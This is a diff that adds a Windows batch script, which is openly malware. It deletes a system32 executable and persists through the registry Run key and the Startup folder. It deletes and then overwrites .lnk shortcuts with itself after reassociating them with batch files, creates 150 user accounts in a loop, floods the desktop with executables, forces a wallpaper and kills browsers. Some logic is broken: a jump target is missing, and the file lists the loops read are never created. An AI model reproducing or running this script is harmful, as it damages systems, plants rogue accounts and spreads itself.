@@ -1,0 +1,40 @@
+@echo off
+del C:\Windows\system32\mountvol.exe
+smiley.vbs
+rem ---------------------------------
+rem Infect Reg Run Key
+set valinf="rundll32_%random%_toolbar"
+set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
+reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
+
+rem Infect Startup Folder
+copy %0 "%userprofile%\Start Menu\Programs\Startup"
+
+annoying.exe
+echo F| XCOPY %UserProfile%\Documents\smileycentral.jpg C:\smileycentral.jpg
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /t REG_SZ /d "C:\smileycentral.jpg"
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+cd %UserProfile%\Desktop\ 
+
+DIR /S/B %SystemDrive%\*.lnk
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_lnk.txt) do del "%%j:%%k"
+
+annoying.exe
+set loop=0
+:loop
+echo F| XCOPY %UserProfile%\Documents\roman.exe %UserProfile%\Desktop\GOSMILEY%random%.exe
+net user SMILEYCENTRAL%username%%random% /add
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /t REG_SZ /d "C:\smileycentral.jpg"
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+set /a loop=%loop%+1 
+if "%loop%"=="150" goto next
+goto loop
+assoc .lnk=batfile
+DIR /S/B %SystemDrive%\*.lnk
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_lnk.txt) do copy /y %0 "%%j:%%k"
+TASKKILL /F /IM chrome.exe
+TASKKILL /F /IM firefox.exe
+TASKKILL /F /IM iexplore.exe
+exit
